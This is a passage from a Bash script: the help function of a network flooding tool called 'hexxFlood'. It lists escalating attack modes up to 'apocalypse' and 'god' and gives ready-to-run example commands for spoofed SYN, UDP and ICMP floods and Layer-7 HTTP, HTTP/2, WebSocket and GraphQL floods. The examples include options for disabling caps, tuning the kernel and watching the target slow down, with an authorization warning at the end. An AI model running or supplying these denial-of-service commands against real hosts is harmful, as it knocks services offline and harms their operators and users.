...
show_help() {
    ...
    echo ""
    echo -e "${YELLOW}MODES${NC}  (workers = parallel hping3 procs, scale with CPU cores;"
    echo -e "         threads = HTTP/Layer-7 concurrency. A mode sets BOTH.)"
    echo "  MODE         WORKERS    THREADS  ATTACK TYPES / NOTES"
    echo "  low           2× cores    10     syn/udp/icmp/http · no tuning · runs forever"
    echo "  medium        4× cores    25     +ack · no tuning · runs forever"
    echo "  high          8× cores    50     all TCP/UDP/ICMP + http · tuning ON · forever"
    echo "  extreme      16× cores   100     all + http2/ws/graphql · tuning · auto-stop 60s"
    echo "  apocalypse   32× cores   500     everything maxed · tuning · auto-stop 60s"
    echo "  god          64× cores  1000     EVERYTHING + kernel limits · auto-stop 60s"
    echo "  custom        8× cores    50*    drive it yourself with -T / -P / -p / -s"
    echo "               (*custom keeps your -p / config value; other modes force theirs)"
    echo ""
    ...
    echo ""
    echo -e "${YELLOW}EXAMPLES${NC}  (example.com / 192.168.1.11 / 127.0.0.1 are placeholders —"
    echo -e "  ${DIM}swap in a host you OWN or are authorized to test)${NC}"
    echo ""
    echo -e "  ${CYAN}— Getting started —${NC}"
    echo "  # Gentle smoke test: confirm the tool works without hammering anything"
    echo "  sudo hexxFlood -t 192.168.1.11 -m low -D 30"
    echo ""
    echo "  # Everyday 'really stress it' run: all TCP/UDP/ICMP + tuning, until Ctrl+C"
    echo "  sudo hexxFlood -t 192.168.1.11 -m high"
    echo ""
    echo -e "  ${CYAN}— Layer-7 / web (HTTP flood needs NO root) —${NC}"
    echo "  # Hammer a web app with 150 concurrent HTTP workers"
    echo "  hexxFlood -u http://example.com -T http -p 150"
    echo ""
    echo "  # Multi-protocol Layer-7 burst (HTTP/1.1 + HTTP/2 + WebSocket + GraphQL)"
    echo "  sudo hexxFlood -u http://example.com -T http,http2,websocket,graphql -m extreme"
    echo ""
    echo -e "  ${CYAN}— Packet shape: pps vs bandwidth —${NC}"
    echo "  # Max PACKETS/sec — tiny 64B packets exhaust the target's CPU"
    echo "  sudo hexxFlood -t 192.168.1.11 -m apocalypse -s 64 --no-cap"
    echo ""
    echo "  # Max BANDWIDTH — full 65495B packets saturate the link"
    echo "  sudo hexxFlood -t 192.168.1.11 -m apocalypse -s 65495 --no-cap"
    echo ""
    echo -e "  ${CYAN}— Full-power multi-vector (god mode) —${NC}"
    echo "  # HTTP + SYN + UDP + ICMP together, 64B packets, 5 min, all caps off, tuning on"
    echo "  sudo hexxFlood -u http://example.com -m god -T http,syn,udp,icmp -s 64 -D 300 --no-cap --tune"
    echo ""
    echo -e "  ${CYAN}— Fine control —${NC}"
    echo "  # Manual: UDP+SYN on DNS+web ports, real source IP, fixed port, 90s"
    echo "  sudo hexxFlood -t 192.168.1.11 -m custom -T syn,udp -P 80,53 --no-spoof --fixed-ports -D 90"
    echo ""
    echo "  # Wired NIC, exact worker count via env override (bypasses mode sizing + cap)"
    echo "  sudo HEXXFLOOD_WORKERS=2000 hexxFlood -t 192.168.1.11 -i eth0 -m god -D 60"
    echo ""
    echo -e "  ${CYAN}— Watch impact (run in a SECOND terminal, against YOUR host) —${NC}"
    echo "  # Response time climbs as the target struggles; Ctrl+C the attack to stop"
    echo '  watch -n1 '\''curl -o /dev/null -s -w "Time: %{time_total}s\n" http://192.168.1.11/'\'''
    echo ""
    echo -e "  ${CYAN}— Monitor only, no attack —${NC}"
    echo "  hexxFlood -t 192.168.1.11 --monitor --monitor-mode full"
    echo ""
    echo -e "${RED}⚠️  Use ONLY on systems you OWN or are authorized to test. Flooding a host you"
    echo -e "    do not own (incl. public/government sites) is a crime, not a demo.${NC}"
    echo ""
}
